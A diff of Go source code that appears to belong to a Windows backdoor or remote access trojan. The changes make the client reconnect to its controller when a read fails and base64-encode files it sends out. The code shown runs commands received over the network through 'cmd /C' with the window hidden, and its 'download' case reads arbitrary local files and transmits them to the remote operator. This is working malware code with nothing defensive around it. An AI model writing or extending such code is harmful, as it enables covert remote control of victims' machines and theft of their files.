@@ -65,8 +65,11 @@ func Connect() {
 	for {
 		// When the command received aren't encoded,
 		// skip switch, and be executed on OS shell.
-		command, _ := bufio.NewReader(conn).ReadString('\n')
-		log.Println(command)
+		command, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil{
+			conn.Close()
+			Connect()
+		}
 
 		// When the command received are encoded,
 		// decode message received, and test on switch
@@ -102,13 +105,13 @@ func Connect() {
 
 		case "download":
 			pathDownload := ReceiveMessageStdEncoding(conn)
-
+			fmt.Println(pathDownload)
 			file, err := ioutil.ReadFile(string(pathDownload))
 			if err != nil {
 				conn.Write([]byte("[!] File not found!" + "\n"))
 			}
 
-			SendMessage(conn, string(file))
+			SendMessage(conn, EncodeBytesToString(file))
 			RemoveNewLineCharFromConnection(conn)
 
 		case "upload":
@@ -217,8 +220,10 @@ func RemoveNewLineCharFromConnection(conn net.Conn) {
 
 func RunCmdReturnByte(cmd string) []byte {
 	cmdExec := exec.Command("cmd", "/C", cmd)
+
 	cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	c, err := cmdExec.Output()
+	cmdExec.Stderr = os.Stderr
 	if err != nil {
 		return []byte(err.Error())
 	}
